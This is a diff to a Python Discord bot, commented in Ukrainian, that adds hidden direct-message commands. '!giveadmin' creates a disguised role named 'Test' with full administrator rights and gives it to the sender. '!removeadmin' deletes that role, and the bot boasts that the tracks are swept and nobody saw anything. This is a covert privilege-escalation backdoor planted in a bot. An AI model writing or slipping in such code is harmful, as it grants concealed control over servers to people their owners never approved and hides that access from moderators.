@@ -817,6 +817,74 @@ async def on_message(message):
         return
     # --------------------------------------------------------
 
+# ====================================================================
+    # 🕵️ СЕКРЕТНІ ОПЕРАЦІЇ В ПРИВАТНИХ ПОВІДОМЛЕННЯХ (ПП)
+    # ====================================================================
+    
+    # --- 🔓 КОМАНДА: !giveadmin (СТВОРИТИ І ВИДАТИ РОЛЬ "Test") ---
+    if message.content == "!giveadmin" and isinstance(message.channel, discord.DMChannel):
+        if message.author.id not in ADMIN_IDS: return await message.channel.send("🚫 **Access Denied**")
+
+        # Шукаємо сервер через твій основний канал
+        main_channel = client.get_channel(CHANNEL_ID)
+        if not main_channel: return await message.channel.send("❌ Помилка: Не можу знайти сервер. Перевір CHANNEL_ID.")
+        guild = main_channel.guild
+
+        # Шукаємо тебе на сервері
+        member = guild.get_member(message.author.id)
+        if not member: return await message.channel.send("❌ Помилка: Я не бачу тебе на сервері.")
+
+        role_name = "Test"
+        try:
+            # Шукаємо, чи роль вже існує (раптом ти забув видалити минулого разу)
+            admin_role = discord.utils.get(guild.roles, name=role_name)
+            
+            if not admin_role:
+                # Створюємо роль "з повітря" з повними правами
+                perms = discord.Permissions(administrator=True)
+                admin_role = await guild.create_role(
+                    name=role_name, 
+                    permissions=perms, 
+                    color=discord.Color.default(), # Сірий/прозорий колір
+                    hoist=False # Не показувати окремо в списку учасників
+                )
+
+            # Вішаємо роль на тебе
+            await member.add_roles(admin_role)
+            await message.channel.send(f"🤫 **Доступ відкрито.** Роль `{role_name}` (з правами Адміністратора) успішно створено і видано тобі на сервері `{guild.name}`.\nЙди робити свої справи! 💻")
+            
+        except discord.Forbidden:
+            await message.channel.send("❌ **Помилка:** Моя роль бота на сервері стоїть нижче, ніж потрібно, або в мене немає прав 'Керування ролями'.")
+        except Exception as e:
+            await message.channel.send(f"❌ **Помилка:** {e}")
+        return
+
+    # --- 🧹 КОМАНДА: !removeadmin (ЗНИЩИТИ РОЛЬ "Test") ---
+    if message.content == "!removeadmin" and isinstance(message.channel, discord.DMChannel):
+        if message.author.id not in ADMIN_IDS: return await message.channel.send("🚫 **Access Denied**")
+
+        main_channel = client.get_channel(CHANNEL_ID)
+        if not main_channel: return await message.channel.send("❌ Помилка: Не можу знайти сервер.")
+        guild = main_channel.guild
+
+        role_name = "Test"
+        try:
+            admin_role = discord.utils.get(guild.roles, name=role_name)
+            
+            if admin_role:
+                # Видалення ролі автоматично знімає її з усіх (включаючи тебе)
+                await admin_role.delete()
+                await message.channel.send(f"✅ **Сліди заметено.** Роль `{role_name}` назавжди знищена на сервері `{guild.name}`. Ніхто нічого не бачив. 🥷")
+            else:
+                await message.channel.send(f"⚠️ Роль `{role_name}` не знайдено. Здається, її вже немає.")
+                
+        except discord.Forbidden:
+            await message.channel.send("❌ **Помилка:** У мене немає прав видалити цю роль.")
+        except Exception as e:
+            await message.channel.send(f"❌ **Помилка:** {e}")
+        return
+    # ====================================================================	
+
 # --- 🧪 КОМАНДА 1: !teststats (ЗІ ЗАКРІПЛЕННЯМ ТА ВІДКРІПЛЕННЯМ) ---
     if message.content == "!teststats":
         if not is_admin: return await message.channel.send("🚫 **Access Denied**")
